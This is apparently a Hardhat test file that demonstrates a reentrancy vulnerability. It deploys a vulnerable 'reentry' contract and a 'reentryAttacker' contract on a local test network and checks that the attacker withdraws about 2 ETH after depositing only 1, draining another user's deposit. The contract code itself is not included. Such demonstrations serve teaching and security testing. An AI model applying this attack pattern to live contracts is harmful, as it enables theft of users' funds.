const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("Reentry vulnerability", function() {
    this.timeout(100000);

    it("Should allow reentry", async function() {
        let [owner, addr1, addr2] = await ethers.getSigners();

        // deploy reentry
        const reentryFactory = await ethers.getContractFactory("reentry");
        const reentryContract = await reentryFactory.connect(owner).deploy();
        await reentryContract.deployed();

        // deploy reentryAttacker
        const reentryAttackerFactory = await ethers.getContractFactory("reentryAttacker");
        const reentryAttackerContract = await reentryAttackerFactory.connect(addr2).deploy(
            addr2.address,
            reentryContract.address
        );
        await reentryAttackerContract.deployed();
        
        // addr1 deposit 1 eth
        await reentryContract.connect(addr1).deposit({
            value: ethers.utils.parseEther("1")
        });

        // desposit and attack
        await reentryAttackerContract.connect(addr2).attack({
            value: ethers.utils.parseEther("1")
        });

        // pre balance
        const prevBal = await ethers.provider.getBalance(addr2.address);

        // withdraw addr2
        await reentryAttackerContract.connect(addr2).withdraw(ethers.utils.parseEther("2"));

        // compare post balance
        const postBal = await ethers.provider.getBalance(addr2.address);
        expect(postBal.sub(prevBal).abs().gt(ethers.utils.parseEther("1.9"))).to.be.true;
    });
});